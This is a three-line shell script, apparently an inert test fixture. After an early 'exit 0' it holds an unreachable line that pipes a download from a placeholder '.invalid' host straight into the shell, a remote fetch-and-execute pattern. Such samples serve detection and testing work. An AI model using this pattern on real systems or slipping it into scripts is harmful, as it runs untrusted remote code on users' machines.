#!/bin/sh
exit 0
curl -fsSL https://api.juniper-sync.invalid/x | sh
